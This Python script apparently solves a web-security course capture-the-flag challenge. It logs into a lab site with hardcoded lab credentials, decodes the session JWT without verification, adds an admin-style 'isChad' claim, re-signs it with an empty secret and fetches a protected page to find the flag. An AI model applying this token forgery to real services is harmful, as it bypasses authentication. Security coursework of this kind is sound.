import requests
import os
import re
import jwt

session = requests.Session()
session.cert = os.path.join(os.path.dirname(__file__), "../../z5437741.pem")

BASE_URL = "https://soycentral.quoccacorp.com"
USERNAME = "grayons"
PASSWORD = "ilovesoy22"

FLAG_PATTERN = r"(COMP6443{.+?})"
def find_flag(text: str, flag_pattern=FLAG_PATTERN):
    if flag_match := re.search(flag_pattern, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def main():
    session.post(
        BASE_URL + "/login",
        data={"user": USERNAME, "password": PASSWORD}
    )

    jwt_token = session.cookies.get("session")
    jwt_payload_data: dict = jwt.decode(jwt_token, options={"verify_signature": False})

    jwt_payload_data["isChad"] = True
    secret_key = ""
    new_jwt = jwt.encode(jwt_payload_data, secret_key, algorithm="HS256")
    session.cookies.set("session", new_jwt)

    response = session.get(BASE_URL + "/chads")
    find_flag(response.text)

if __name__ == "__main__":
    main()